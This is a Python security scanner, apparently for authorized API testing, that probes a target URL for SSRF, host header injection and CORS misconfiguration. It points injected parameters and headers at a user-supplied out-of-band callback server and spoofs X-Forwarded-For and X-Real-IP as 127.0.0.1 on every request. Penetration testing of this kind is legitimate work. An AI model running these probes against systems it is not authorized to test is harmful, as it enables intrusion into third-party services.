import requests
import argparse
import random
import json
import sys

# Owasp-Api-Audit: Advanced OOB & Logic Scanner
# Author: @canmitm | ahmetcan0x01@gmail.com
# Use for authorized testing only.

class OWASPAudit:
    def __init__(self, target):
        self.target = target
        print("\n[!] OWASP-API-Audit Initialized.")
        self.oob = input("[?] Enter your OOB Server (e.g. xxxxx.oast.fun or webhook.site/uuid): ").strip()
        if not self.oob:
            print("[ERROR] OOB Server is required for Out-of-Band testing.")
            sys.exit(1)

        self.user_agents = [
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.66 Mobile Safari/537.36"
        ]

    def get_headers(self):
        return {
            "User-Agent": random.choice(self.user_agents),
            "Accept": "application/json, text/plain, */*",
            "X-Real-IP": "127.0.0.1",
            "X-Forwarded-For": "127.0.0.1"
        }

    def run_scan(self):
        with open('payloads.json', 'r') as f:
            data = json.load(f)

        print(f"[*] Target: {self.target}")
        print(f"[*] OOB: {self.oob}")
        print("-" * 40)

        # 1. SSRF & OOB Parameter Testing
        for param in data['ssrf_params']:
            payload = f"http://{param}.{self.oob}"
            full_url = f"{self.target}?{param}={payload}"
            try:
                requests.get(full_url, headers=self.get_headers(), timeout=7)
                print(f"[+] Tested Param: {param} -> Check OOB.")
            except: pass

        # 2. Host Header Injection & Poisoning
        print("[*] Fuzzing Host Headers...")
        for header in data['host_headers']:
            h = self.get_headers()
            h[header] = self.oob
            try:
                requests.get(self.target, headers=h, timeout=7)
                print(f"[+] Header Injected: {header}")
            except: pass

        # 3. CORS Audit
        print("[*] Auditing CORS Policy...")
        h = self.get_headers()
        h["Origin"] = f"https://{self.oob}"
        try:
            res = requests.get(self.target, headers=h, timeout=7)
            if res.headers.get("Access-Control-Allow-Origin") == f"https://{self.oob}":
                print(f"[CRITICAL] CORS Misconfiguration Detected!")
        except: pass

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="OWASP-API-Audit | Offensive API Testing Tool")
    parser.add_argument("-t", "--target", required=True, help="Target API/Web URL")
    args = parser.parse_args()

    scanner = OWASPAudit(args.target)
    scanner.run_scan()
